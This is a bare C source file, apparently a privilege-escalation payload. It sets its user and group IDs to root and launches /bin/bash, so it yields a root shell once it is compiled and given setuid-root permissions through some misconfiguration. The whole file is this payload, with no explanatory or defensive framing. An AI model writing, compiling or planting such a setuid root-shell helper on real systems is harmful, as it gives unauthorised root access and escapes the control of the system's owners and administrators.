#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
